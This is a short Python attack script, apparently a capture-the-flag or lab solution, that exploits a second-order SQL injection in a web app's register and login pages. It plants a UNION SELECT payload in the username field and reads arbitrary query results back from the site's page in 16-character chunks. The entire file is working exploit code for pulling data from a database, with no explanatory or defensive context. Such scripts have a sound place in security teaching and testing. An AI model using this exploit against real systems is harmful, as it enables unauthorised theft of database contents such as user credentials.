#!/usr/bin/env python3

import requests
import sys
from bs4 import BeautifulSoup

url_base = sys.argv[1]
payload = sys.argv[2]
index = 1

while True:
    sqli_payload = f'" UNION SELECT 1,SUBSTR(({payload}), {index}, 16);#'
    s = requests.session()
    s.post(url_base + "register.php", data={"username": sqli_payload, "password": "jxf", "submit": "Submit Query"})
    s.post(url_base + "login.php", data={"username": sqli_payload, "password": "jxf", "login": "Submit Query"})
    r = s.get(url_base)
    soup = BeautifulSoup(r.text, "html.parser")
    tables = soup.find_all("table", class_="u-full-width")
    output = tables[1].find("td").get_text()
    print(output, flush=True, end="")
    if len(output) < 16:
        break
    index += 16

print()
